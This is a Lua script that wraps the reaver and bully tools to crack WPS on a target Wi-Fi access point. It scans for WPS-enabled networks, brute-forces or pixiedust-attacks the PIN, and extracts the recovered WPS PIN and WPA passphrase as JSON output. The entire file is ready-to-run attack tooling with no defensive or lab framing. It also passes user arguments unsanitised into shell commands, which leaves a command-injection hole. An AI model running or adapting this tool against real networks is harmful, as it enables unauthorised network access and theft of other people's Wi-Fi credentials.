#!/usr/bin/env lua

local iface = arg[1]
local bssid = arg[2] or ""
local pin = arg[3] or ""
local channel = tonumber(arg[4]) or 0
local timeout = tonumber(arg[5]) or 120
local method = arg[6] or "pixiedust"

local function json_escape(s)
  return '"' .. tostring(s):gsub('\\', '\\\\'):gsub('"', '\\"'):gsub('\n', '\\n'):gsub('\r', '\\r') .. '"'
end

local function telemetry(event, data)
  local ts = tostring(os.time())
  io.write('{"event":' .. json_escape(event) .. ',"iface":' .. json_escape(iface) .. ',"bssid":' .. json_escape(bssid) .. ',"ssid":"","channel":' .. tostring(channel) .. ',"data":' .. data .. ',"timestamp":' .. json_escape(ts) .. '}\n')
  io.flush()
end

local function check_monitor_mode()
  local cmd = "iw dev " .. iface .. " info 2>/dev/null"
  local f = io.popen(cmd)
  if not f then return false end
  local out = f:read("*a")
  f:close()
  if out:find("type monitor") then
    telemetry("monitor_ok", '{"message":"Monitor mode confirmed"}')
    return true
  end
  telemetry("monitor_fail", '{"message":"Interface not in monitor mode"}')
  return false
end

local function scan_wps()
  local cmd = "wash -i " .. iface .. " 2>/dev/null"
  telemetry("wps_scan", '{"cmd":' .. json_escape(cmd) .. '}')
  local f = io.popen(cmd)
  if not f then
    telemetry("wps_scan_fail", '{"error":"wash not available"}')
    return false
  end
  local ap_count = 0
  local header = true
  while true do
    local line = f:read("*l")
    if not line then break end
    if header then
      if line:find("BSSID") then header = false end
    else
      local bssid_found = line:match("^%s*([0-9a-fA-F:]+)")
      if bssid_found then
        local ch = line:match("%s+(%d+)%s+") or ""
        local rssi = line:match("%s+(-?%d+)%s+") or ""
        local wps_ver = line:match("%s+(%d%.%d)%s+") or ""
        local locked = line:match("Yes") and "Yes" or "No"
        telemetry("wps_ap", '{"bssid":' .. json_escape(bssid_found) .. ',"channel":' .. json_escape(ch) .. ',"signal":' .. json_escape(rssi) .. ',"wps_version":' .. json_escape(wps_ver) .. ',"locked":' .. json_escape(locked) .. '}')
        ap_count = ap_count + 1
      end
    end
  end
  f:close()
  telemetry("wps_scan_complete", '{"aps_found":' .. tostring(ap_count) .. '}')
  return ap_count > 0
end

local function reaver_attack()
  local cmd = "reaver -i " .. iface .. " -b " .. bssid
  if pin ~= "" then cmd = cmd .. " -p " .. pin end
  if channel > 0 then cmd = cmd .. " -c " .. channel end
  cmd = cmd .. " -vvv -t " .. tostring(timeout) .. " 2>&1"
  telemetry("reaver_start", '{"method":"reaver","cmd":' .. json_escape(cmd) .. '}')
  local f = io.popen(cmd)
  if not f then
    telemetry("reaver_fail", '{"error":"reaver not available"}')
    return false
  end
  local pin_found = ""
  local psk = ""
  while true do
    local line = f:read("*l")
    if not line then break end
    if line:find("WPS PIN") then
      pin_found = line:match("WPS PIN: '([^']+)'") or ""
      telemetry("pin_found", '{"pin":' .. json_escape(pin_found) .. '}')
    end
    if line:find("WPA PSK") then
      psk = line:match("WPA PSK: '([^']+)'") or ""
      telemetry("psk_found", '{"psk":' .. json_escape(psk) .. '}')
    end
    if line:find("Pin is") or line:find("PIN") then
      telemetry("reaver_progress", '{"line":' .. json_escape(line:sub(1, 150)) .. '}')
    end
  end
  f:close()
  telemetry("reaver_complete", '{"pin":' .. json_escape(pin_found) .. ',"psk":' .. json_escape(psk) .. '}')
  return pin_found ~= "" or psk ~= ""
end

local function bully_attack()
  local cmd = "bully -i " .. iface .. " -b " .. bssid
  if pin ~= "" then cmd = cmd .. " -p " .. pin end
  if channel > 0 then cmd = cmd .. " -c " .. channel end
  if method == "pixiedust" then cmd = cmd .. " -d" end
  cmd = cmd .. " -v 3 2>&1"
  telemetry("bully_start", '{"method":"bully","cmd":' .. json_escape(cmd) .. '}')
  local f = io.popen(cmd)
  if not f then
    telemetry("bully_fail", '{"error":"bully not available"}')
    return false
  end
  local pin_found = ""
  local psk = ""
  while true do
    local line = f:read("*l")
    if not line then break end
    local p = line:match("PIN: '([^']+)'")
    if p then pin_found = p end
    local k = line:match("Key: '([^']+)'")
    if k then psk = k end
    if p or k then
      telemetry("bully_success", '{"pin":' .. json_escape(pin_found) .. ',"key":' .. json_escape(psk) .. '}')
    end
  end
  f:close()
  telemetry("bully_complete", '{"pin":' .. json_escape(pin_found) .. ',"key":' .. json_escape(psk) .. '}')
  return pin_found ~= ""
end

if arg[1] == "--help" then
  print("Usage: wps_cracker.lua <interface> [bssid] [pin] [channel] [timeout] [method]")
  print("WPS cracking with PixieDust and PIN brute-force")
  print("Methods: pixiedust, pin_brute, bully")
  print("Example: wps_cracker.lua wlan0 00:11:22:33:44:55 '' 6 120 pixiedust")
  os.exit(0)
end

if not iface then
  telemetry("error", '{"error":"Usage: wps_cracker.lua <interface> [bssid] [pin] [channel] [timeout] [method]"}')
  os.exit(1)
end

if not check_monitor_mode() then
  telemetry("error", '{"error":"Monitor mode required on ' .. iface .. '"}')
  os.exit(1)
end

if bssid == "" then
  scan_wps()
  telemetry("scan_done", '{"message":"Run again with a target BSSID"}')
  os.exit(0)
end

if channel > 0 then
  os.execute("iw dev " .. iface .. " set channel " .. tostring(channel) .. " 2>/dev/null")
end

telemetry("crack_start", '{"bssid":' .. json_escape(bssid) .. ',"method":' .. json_escape(method) .. '}')

local ok = reaver_attack()
if not ok then
  telemetry("fallback", '{"message":"reaver failed, trying bully"}')
  ok = bully_attack()
end

telemetry("complete", '{"success":' .. tostring(ok) .. '}')
